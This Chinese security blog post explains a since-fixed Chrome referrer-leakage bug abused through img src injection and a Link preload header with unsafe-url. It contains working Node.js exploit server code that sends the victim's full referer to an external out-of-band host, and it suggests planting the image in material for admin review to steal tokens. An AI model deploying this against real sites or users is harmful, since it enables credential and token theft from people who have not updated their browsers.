> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIzMDM2MjY5NA==&mid=2247484336&idx=1&sn=be05aaff95bac7ab6b6560a3a207d01c

#  chrome “0day”讲解一二  
原创 testbywlp  安全边角料   2025-06-23 09:37  
  
- 前文  
  
    想写这篇文章已经很久很久了，感觉快拖一个月之久，今天刚好有时间将这篇文章输出一下，供大家参考。  
- 正文  
  
    事情的起因还得从x说起，有个人在x上发表了一篇推文，说他发现了一个chrome不为人知的特性，整个过程分为三步走，  
  
第一步插入一个img标签  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1VPyfLBq7icHlRBxbibMmuHeUKX7qxODbHFWic96aBIsNmwcl4k4GxZNBcg02ict4xNaoTXibrCO2t8ncg/640?from=appmsg "")  
  
第二步部署img src属性服务器，可以看到作者进行了特殊操作  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lmvdhjeZU1VPyfLBq7icHlRBxbibMmuHeUrcVsJYtyGZlGobeEvaUQByVIh8O4M8iaZdbnILDxQz0B0aa6EmOuHRA/640?wx_fmt=jpeg&from=appmsg "")  
![]( "")  
  
通过img标签访问返回特殊头  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lmvdhjeZU1VPyfLBq7icHlRBxbibMmuHeUadAX3GIQQt65GTslpOUbygdSliaJCt8yLOicXp9LXzJx2MJ52drC6lbg/640?wx_fmt=jpeg&from=appmsg "")  
![]( "")  
  
第三步客户端访问图片时携带完整的referer信息  
  
![Image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lmvdhjeZU1VPyfLBq7icHlRBxbibMmuHeUuSHSCPb8fClNpcGLticMcEBBJ0x8DscIXASiaUnQjDvB3rnejJ0aWnWg/640?wx_fmt=jpeg&from=appmsg "")  
![]( "")  
- 疑问  
  
    写到这里你是不是在想，这什么脏东西？有什么用吗？我劝你别急，冷静, 冷静, 再冷静  
- 循序渐进  
  
    我们需要明白作者干了什么？他如何做到的？他绕过了哪些chrome的防护策略？  
- 做了什么  
  
    他通过类似img 的src属性值注入在跨域情况下拿到了系统的完整referer  
  
    是不是觉得这个事很简单？事实真的事如此吗？一般情况下，如果我们想拿跨域referer是否就能随便拿，不是哦；如果我们跨域加载一张图片，那么这个图片的referer会时这样的，只会发送三个元素，协议，主机名以及端口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1VPyfLBq7icHlRBxbibMmuHeUgSfLws6DuibSzBDoibTsDTjMb6Bib3cvBmepYLhpDEjMPAnicOGiaQd8JSQ/640?wx_fmt=png&from=appmsg "")  
  
为什么我访问的明明是  
  
http://127.0.0.1/test1.html?token=aduahduahdaydyadad   
，但是跨域加载图片的时候referer却变成了  
http://127.0.0.1/，这就是浏览器的安全机制，因为图片加载跨域随处可见, 如果在加载三方图片的时候携带完整的referer，就有可能泄露敏感信息  
  
这就引出了第二个问题，同源加载图片会携带完整referer吗？答案是会的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1VPyfLBq7icHlRBxbibMmuHeUA11q8zlxiaflUS8U1pMEEKfMibxribonN5EyFGG7rIwdwdcQTRPBFncYA/640?wx_fmt=png&from=appmsg "")  
  
接着如果研发设置no-referer呢？那就不会发送referer头  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1VPyfLBq7icHlRBxbibMmuHeUI8xY6NiaQicFYicGYls5vttFAQibeNmZmekgNEAYETiaxGRLno9lJTyNCNg/640?wx_fmt=png&from=appmsg "")  
  
当设置referrerpolicy="unsafe-url"的时候，在chrome浏览器中会强制携带完整referer参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1VPyfLBq7icHlRBxbibMmuHeUJADZ1vjqeKRokkd75UMjtsBTBiccDYhWLvC0P8FU1gsj27dSPXY3BSw/640?wx_fmt=png&from=appmsg "")  
  
    到这里应该大致明白了，就是作者绕过了默认情况下跨域的referer限制，通过注入img标签的src属性值成功拿到了完整的referer参数，这其实是一个很厉害的成果，让谷歌自己的策略相互矛盾  
- 复现  
  
    作者是怎么做到的呢？接下来我们一步一步复现来查看他的具体过程，首先我们需要一个nodejs写的服务器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1WzYgkleoFs3gaCSDn4DFFYicicDLcibtFvEMBSPH2Ftz34S95Mup9VSDJXoJzwXDgtN0XIjDzOiaEemw/640?wx_fmt=png&from=appmsg "")  
  
为了方便大家直接使用，直接放代码  

```
const express = require('express');
const app = express();
const port = 9999;
const path = require('path');
app.get('/image.jpg', (req, res) => {
    res.setHeader('Link', '<http://apgflqrehhviutnoxzqzkj9l1df93rt8g.oast.fun/log>;rel=&#34;preload&#34;; as=&#34;image&#34;; referrerpolicy=&#34;unsafe-url&#34;');
    res.sendFile(path.join(__dirname, 'logo.jpg'));
});
app.get('/log', (req, res) => {
    console.log(req.headers['referer']);
    res.send('Hi!');
});
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
```

  
html页面代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1WzYgkleoFs3gaCSDn4DFFYJMh6m0azqLadiahhKpnzSPGic6A6taQHX6OZhmpAkfPIxvicwdXX0uV4A/640?wx_fmt=png&from=appmsg "")  
  
    在最新版本chrome打开试试效果，可以看到Link确实被访问了，但是并没有带referer啊  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1WzYgkleoFs3gaCSDn4DFFYoxUeB9VGO5ibCos09eoNSfAu8CNp6rsnYkLiak44Rv9jwvYND41WEoIQ/640?wx_fmt=png&from=appmsg "")  
  
不仅仅通过ip，也通过域名尝试并未发现携带完整referer的情况  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1WzYgkleoFs3gaCSDn4DFFY3hz1a8PwkrfTdyZKjCUKQmq9CcDTxKxI9QVbPVg4zAdqeIVaB6ynWQ/640?wx_fmt=png&from=appmsg "")  
  
这就让我有点好奇了，有没有可能被修复了，所以就去寻找官方的发布文档，终于找到了被修复的证据  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1WzYgkleoFs3gaCSDn4DFFYibYTXDqlOGPXiapmfcSN51xjkN4nDatm9BhzYIrT6c8bbPy8DwVUmLYQ/640?wx_fmt=png&from=appmsg "")  
  
可能有些人会问，TBD是什么意思，别的漏洞都给美刀，这个为啥是TBD？难道是一种新的货币？不是的，TBD的意思是  
To Be Determined，  
中文意思是待确定赏金。  
  
到这一步了，我们就知道该如何去复现这个0day漏洞，需要下载一个  
136.0.7103.1  
02版本之前的chrome浏览器，链接放在下面了  
  
https://google-chrome.cn.uptodown.com/windows/download/1071177372  
  
    访问图片返回link头  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1WzYgkleoFs3gaCSDn4DFFYOAibs3IxP6IqgRZ5oDaTuxCfhjyo4iaj3aqkPGSNgMNoB6zfZg0dgIIA/640?wx_fmt=png&from=appmsg "")  
  
    访问link成功获取token  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1WzYgkleoFs3gaCSDn4DFFYJ7TJsymcU0f8ZTEpg5gazyMibcI22LaqXRbESywNrgCTc60Ipd5VmSQ/640?wx_fmt=png&from=appmsg "")  
- 场景  
  
    既然这个0day存在，那么利用场景应该是我们需要去考虑的。现在回头想想，我们以前挖到img的src属性值注入都是怎么利用的？目前已知的可能就这么几种：  
- src属性值插入系统退出链接，这种只能对GET请求起作用，危害的话就是访问图片退出系统  
  
- 插入自己的服务器上的图片，有些系统在访问图片时会携带TOKEN、authoraztion等认证头  
  
    而这个漏洞的出现给了我们更多的选择性，可能有人会说最新版本已经修复了，但是不能所有人都更新了吧，如果你能给管理员用户提交审核时伪造资料图片链接地址，在他没更新浏览器的情况下是不是能拿到他的referer，如果再运气好，拿到token类似的岂不是发了。  
  
除了上述没有更新chrome浏览器的情况之外，可以考虑下移动端，因为很多浏览器都是基于chrome的内核来改的，或许就会支持它的一些特性  
- 实践  
  
    国外小哥通过这个漏洞拿到token  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1WzYgkleoFs3gaCSDn4DFFYXxACwj3Rib7azdwazxUu0kOIS900x0HqxMeG8jD6s7QvCNK9ubtqZIA/640?wx_fmt=png&from=appmsg "")  
  
另一个人则发现相似的利用手段  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lmvdhjeZU1WzYgkleoFs3gaCSDn4DFFY8rdXorH7rzC9VDZWQg3DPMbMv679vmXibDmkTzzibJbID2QcwQD7jjgg/640?wx_fmt=png&from=appmsg "")  
- 参考文章  
  
https://blog.voorivex.team/leaking-oauth-token-via-referrer-leakage  
  
